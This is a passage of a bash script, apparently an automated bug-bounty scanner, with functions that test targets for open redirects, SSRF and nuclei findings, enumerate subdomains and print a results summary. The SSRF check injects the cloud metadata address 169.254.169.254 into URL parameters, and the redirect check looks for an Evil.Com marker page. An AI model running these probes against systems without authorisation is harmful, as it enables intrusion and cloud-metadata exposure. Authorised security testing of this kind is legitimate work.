    [ ! -f vulnerabilities/openredirect.txt ] && cat temp/opredirect.txt | xargs -P 50 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure -iL '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[${RED}POTENTIAL OPREDIRECT${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL OPREDIRECT" | anew vulnerabilities/openredirect.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Open redirect${TICK}${NORMAL}]\t Found: ${GREEN}$(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l )"
}

ssrf(){
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SSRF${NORMAL}]\r"
    [ ! -f temp/ssrf.txt ] && cat domains/patterns/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q temp/ssrf.txt
    [ ! -f vulnerabilities/ssrf.txt ] && cat temp/ssrf.txt | xargs -P 55 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[${RED}POTENTIAL SSRF${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew vulnerabilities/ssrf.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SSRF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l )"
}

nuclei(){
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Nuclei${NORMAL}]\r"
    [ ! -f nuclei/info.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity info -c 50 -silent" 2> /dev/null | anew -q nuclei/info.txt
    [ ! -f nuclei/low.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity low -c 50 -silent" 2> /dev/null | anew nuclei/low.txt 
    [ ! -f nuclei/medium.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity medium -c 50 -silent" 2> /dev/null | anew nuclei/medium.txt 
    [ ! -f nuclei/high.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity high -c 50 -silent" 2> /dev/null | anew nuclei/high.txt 
    [ ! -f nuclei/critical.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity critical -c 50 -silent" 2> /dev/null | anew nuclei/critical.txt 
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Nuclie${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat  nuclei/medium.txt nuclei/high.txt nuclei/critical.txt 2> /dev/null | wc -l )"
}

result() {
    echo -e "\n${BOLD}${GREEN} 
▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀
▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░
▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\n"
    if [ -n "$domain" ];then echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains of ${RED}$domain${NORMAL}\n"; fi
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Found:${NORMAL}${BOLD}${GREEN} $(cat subdomains/subdomains.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Alive:${NORMAL}${BOLD}${GREEN} $(cat subdomains/alivesub.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Endpoints:${NORMAL}${BOLD}${GREEN} $(cat subdomains/endpoints.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} XSS:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/xss.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SQLi:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Open Redirect:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSRF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} CRLF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} LFI:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomain Takeover:${NORMAL}${BOLD}${GREEN} $(cat subdomains/takeover.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Nuclei:${NORMAL}${BOLD}${GREEN} $(cat  nuclei/medium.txt nuclei/high.txt nuclei/critical.txt 2> /dev/null | wc -l)${NORMAL}\n"
}

subScan(){
    mkdir -p temp
    mkdir -p subdomains
    if [ -n "$subdomainFile" ]; then
        echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Using provided subdomains from ${subdomainFile}${NORMAL}\n"
        cp "$subdomainFile" subdomains/subdomains.txt
    
    # elif [ -n "$subdomainFileContent" ]; then
    #     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Using provided subdomains from stdin${NORMAL}\n"
    #     echo "$subdomainFileContent" > subdomains/subdomains.txt
    
    else
        echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Enumeration is in progress:${NORMAL}${BOLD} Scanning subdomains of ${RED}$domain${NORMAL}\r"  
        sleep 1s
        passive_subenum
        sleep 2s
        active_subenum
        sleep 2s
        out_of_scope_subdomain_filtering
    fi
    sleep 1s
    alive_subdomain_filtering
    sleep 2s
    subdomain_inspection
    sleep 1s
    echo -ne "${NORMAL}${BOLD}${LGREEN}\n[●] Subdomain Enumeration Completed. ${WHITE}\t Total: ${GREEN}$(cat subdomains/subdomains.txt 2> /dev/null | wc -l )${WHITE} | Alive: ${GREEN}$(cat subdomains/alivesub.txt 2> /dev/null | wc -l )\n"   

}

crawl(){
    mkdir -p patterns
    sleep 2s
    crawl_endpoints
    sleep 2s
    endpoints_and_pattern_filtering
    sleep 1s   
}

vulnScan(){ 
    mkdir -p vulnerabilities
    mkdir -p nuclei
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning is in progress:${NORMAL}${BOLD} Getting all vulnerabilities of $domain"  
    sleep 2s
    xss
    sleep 2s
    sqli
    sleep 2s
    lfi 
    sleep 2s
    crlf
    sleep 2s
    ssrf 
    sleep 2s
    sensitive
    sleep 2s
    openredirect
    sleep 2s
    subdomain_takeover
    sleep 2s
    nuclei
    sleep 1s
    echo -ne "${NORMAL}${BOLD}${LGREEN}\n[●] Vulnerabilities Scanning Completed. ${WHITE}\t Check: ${GREEN}$(echo '/vulnerabilities/')\n"  
}

webcopilot(){
    subScan 2> /dev/null
    crawl 2> /dev/null
    vulnScan 2> /dev/null
    result
}

while true
do 
    banner
    info 
    if [ -n "$allScanning" ]; then webcopilot; else subScan; fi
    exit 1
done
